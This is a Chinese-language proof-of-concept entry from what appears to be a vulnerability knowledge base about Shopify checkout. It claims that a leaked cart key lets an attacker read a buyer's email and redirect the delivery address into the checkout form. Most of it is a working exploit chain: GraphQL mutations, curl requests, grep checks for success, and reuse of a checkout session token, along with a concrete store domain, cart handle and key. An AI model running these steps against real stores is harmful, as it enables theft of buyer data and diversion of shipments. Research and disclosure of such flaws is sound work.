# Shopify 泄露 cart key 后，带 key 的 cart permalink 结账页会序列化买家 email 与攻击者改写的收货地址（收货改道落到结账表单）

- **code**: shopify-keyed-cart-permalink-checkout-page-prefill-pii
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront / Checkout One（/web/api/graphql cartPrepareForCompletion + /cart/c/{handle} permalink + /checkouts/unstable/graphql session）
- **severity**: high
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 UTC，retro-refresh.com 实测（自建合成 cart，无 Cookie）：裸 handle hWNJ2Q0h2IR59uSlL0j1DsuO 经 /web/api/graphql cartPrepareForCompletion 回显 ?key=191ea9d3dacee43b032e41fe1f581d98 与 email i2969-victim1@example.com；用该 key cartNoteUpdate→userErrors=[]、cartDeliveryAddressesAdd Attacker/666 Redirect Lane/M1 1AA→userErrors=[]；/api/graphql cartSubmitForCompletion 裸 handle→SubmitFailed PAYMENTS_METHOD_REQUIRED + checkoutUrl。GET /cart/c/<handle>?key=191ea9... 跟随重定向到 /checkouts/cn/hWNJ2Q0h2IR59uSlL0j1DsuO/en-gb 200（332KB），页面命中 i2969-victim1@example.com ×3、666 Redirect Lane ×3（input name=address1 value 预填）、M1 1AA ×3、PWNED note ×2；不带 key 的同 permalink 生成 checkout 页面 email/地址 0 命中。结账页 meta serialized-sessionToken 调 /checkouts/unstable/graphql session→200 sessionType=CART_API、sourceId=hWNJ2Q8OnlKJZJsVkDlMlrOS，无 token→INVALID_SESSION_TOKEN。
- **path**: pocs/shopify-keyed-cart-permalink-checkout-page-prefill-pii/poc.txt
- **tags**: shopify,checkout,cart,idor,pii,address,prepare-for-completion,permalink
- **created_at**: 2026-11-11T21:45:20.934Z
- **engine**: https://retro-refresh.com
- **found_by**: exploit

## 描述

前置：已通过 cartPrepareForCompletion 裸 handle 获得目标 cart 真实 ?key（见 KB#606/#701）。此前 KB#606 记录「地址改道停留在 cart 层、结账侧不序列化收货地址」；本条目补充：用泄露 key 打开 /cart/c/{handle}?key=... 时，结账页会序列化 buyerProposal.buyerIdentity.email 与 deliveryLines[].destinationAddress，并把地址表单 value 预填为攻击者地址；不带 key 的同 permalink 生成的 checkout 则不序列化 email/地址（仅 note/商品）。

## 用法

```
# 0) 先按 KB#606 用裸 handle 拿到真实 ?key 与 email
# 1) 用 key 写 note/收货地址（cartNoteUpdate / cartDeliveryAddressesAdd）
# 2) 用 key 打开 permalink 并落盘结账页：
curl -sS -L --max-redirs 6 -c ck.txt -D hdr.txt -o checkout.html 'https://<shop>/cart/c/<handle>?key=<KEY>'
# 3) 判据：
grep -c '<victim_email>' checkout.html          # ≥1
grep -c '<attacker_address1>' checkout.html     # ≥1，且 input value 预填
# 4) 如需结账会话：从页面 meta 提取 serialized-sessionToken 后
curl -sS -X POST 'https://<shop>/checkouts/unstable/graphql' -H 'Content-Type: application/json' -H "x-checkout-one-session-token: <token>" --data '{"query":"query{ session { sessionType sourceId finished } }"}'
```

## 正文

```
# 利用链（全部实测）

1) 裸 handle 取 key（KB#606/#701 同机理）：
POST /web/api/graphql
{"query":"mutation P($id:ID!){cartPrepareForCompletion(cartId:$id){result{__typename ... on CartStatusNotReady{cart{id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} ... on CartStatusReady{cart{id buyerIdentity{email} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}}}}}}","variables":{"id":"gid://shopify/Cart/<handle>"}}
→ 回显 cart.id 带真实 "?key=<KEY>" 与 buyerIdentity.email。

2) 用泄露 KEY 写 cart 地址（cartDeliveryAddressesAdd，userErrors=[]）后提交：
POST /api/graphql {"query":"mutation Submit($id:ID!,$t:String!){cartSubmitForCompletion(cartId:$id,attemptToken:$t){result{__typename ... on SubmitFailed{checkoutUrl errors{code message}}}}}","variables":{"id":"gid://shopify/Cart/<handle>","t":"<uuid>"}}
→ SubmitFailed PAYMENTS_METHOD_REQUIRED + checkoutUrl=https://<shop>/cart/c/<handle>（不带 key）；带 key 时 checkoutUrl 带 ?key=<KEY>。

3) 决定性：GET https://<shop>/cart/c/<handle>?key=<KEY> 跟随重定向：
302 shop.app/checkout/<shopId>/cn/<checkout>/<locale>/shoppay?... → 302 https://<shop>/checkouts/cn/<checkout>/<locale> → 200 结账页。
页面中实测命中：买家 email（buyerProposal.buyerIdentity.email / FilledBuyerIdentityTerms.email）；攻击者地址在 deliveryLines[].destinationAddress，且收货表单 input name="address1" value="..."、name="postalCode" value="..." 已预填；cart note 也在页面数据里。

4) 对照：GET /cart/c/<handle>（不带 key）→ 同样 302 进结账并 200，但生成的 checkout 不序列化 email/地址（buyerIdentity.email=null、shippingAddresses=[]），仅 note/商品可见。

5) 结账会话：页面 meta serialized-sessionToken（AAEB...）可直接用于 POST /checkouts/unstable/graphql
header x-checkout-one-session-token: <token>
{"query":"query{ session { sessionToken sourceId sessionType finished checkoutSessionIdentifier } }"}
→ 200 sessionType=CART_API / sourceId=<checkout id> / finished=false；无 token 对照 INVALID_SESSION_TOKEN。注意该端点的 Mutation 类型 introspection 返回 __type:null。

# 判据
- 带 key 的 permalink 结账页 HTML 中 grep 到买家 email 与攻击者 street/postcode（表单 value 预填）= 收货改道落到结账层成立。
- 不带 key 的 permalink 页面 grep 不到 email/地址 = 需要 key 才能带入（说明与 KB#606 的差异来自 key 的有无，而非目标差异）。

# 坑
- 合成 cart 的 buyerIdentity.email 只有在带 key 的 permalink 路径才进入 checkout；无 key 路径被清空。
- cart 地址在 submit 后从 cart 清除（已转移到 checkout），裸 handle query 只剩 note。
- handle 108bit 随机不可枚举，需先有 handle（共享 /cart/c/ 链接、Referer、ShopifyAnalytics.meta.cart.id）。
- 验证只应使用自建合成 cart；不要触碰真实客户、不要提交支付。
```
